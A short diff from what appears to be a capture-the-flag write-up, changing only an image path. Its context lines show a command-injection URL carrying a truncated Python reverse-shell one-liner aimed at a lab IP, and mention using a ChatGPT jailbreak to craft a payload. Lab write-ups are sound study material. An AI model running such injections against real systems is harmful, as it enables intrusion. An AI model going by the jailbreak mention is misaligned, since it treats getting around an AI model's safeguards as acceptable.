@@ -247,7 +247,7 @@ http://10.10.14.38/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.so
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (10).png" alt=""><figcaption></figcaption></figure>
 
 Using a Jailbreak on ChatGPT, I was also able to craft a payload:
 
